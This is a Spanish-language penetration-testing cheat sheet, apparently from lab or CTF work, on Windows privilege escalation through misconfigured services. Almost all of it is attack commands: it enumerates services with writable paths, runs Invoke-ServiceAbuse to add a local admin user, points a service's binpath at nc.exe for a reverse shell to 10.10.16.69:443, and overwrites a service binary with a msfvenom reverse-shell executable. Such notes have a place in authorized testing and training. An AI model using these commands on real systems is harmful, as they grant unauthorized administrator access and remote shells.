Ejecutar función auxiliar: Función Auxiliar

Listar servicios con binarios y Path modificables. Ej. Servicio vulnerable filepermsvc

# PowerShell: Enumera todos los servicios desde los registros
ls HKLM:\SYSTEM\CurrentControlSet\Services\

# PowerShell: Enumera servicios que ejecutan un binario .exe y su ruta es modificable
Get-WMIObject -Class win32_service | Where-Object {$_ -and $_.pathname} | ForEach-Object { if(ModifiablePath (($_.pathname -split ".exe")[0]+".exe")){ $_ } }

# CMD
wmic service list brief  # Enumera todos los servicios

Payloads

# Payload 1: Crear usuario john y lo añade local_admin
Invoke-ServiceAbuse -ServiceName 'UsoSvc'

# Payload 2: Ejecutar nc.exe
Invoke-ServiceAbuse -ServiceName 'UsoSvc' -Command "C:\windows\temp\prives\nc.exe 10.10.16.69 443 -e cmd.exe"

# Payload 3: Modificar Path para ejecutar nc.exe o un backdoor con msfvenom
# Powershell Enumera Path del servicio UsoSvc
Get-WMIObject -Class win32_service | Where-Object {$_.Name -eq "UsoSvc"} | Select-Object *
# CMD Enumera Path del servicio UsoSvc
sc.exe qc UsoSvc
# Modificar Path
sc.exe config UsoSvc binpath="C:\windows\temp\prives\nc.exe 10.10.16.69 443 -e cmd.exe"
# Reiniciar servicio
sc.exe stop UsoSvc
sc.exe start UsoSvc

Hijacking del binario del servicio

Ver Path del Binario del servicio filepermsvc

# PowerShell
Get-WMIObject -Class win32_service | Where-Object {$_.Name -eq "filepermsvc"} | Select-Object *
# CMD
sc qc <service_name>

# Path: C:\Program Files\filepermservice.exe

Comprobar permisos de escritura en el Path

# PowerShell/CMD
icacls "C:\Program Files\filepermservice.exe"

Kali: Payload y Listener

msfvenom -p windows/shell_reverse_tcp LHOST=<kali_ip> LPORT=443 -f exe > rev.exe
rlwrap nc 443

Reemplazar el binario por una reverse shell

# PowerShell
copy rev.exe "C:\Program Files\filepermservice.exe"

Reiniciar el servicio. Se debe producir un fallo al reiniciar

cmd /c sc start filepermservice

net stop filepermservice # Alternativa
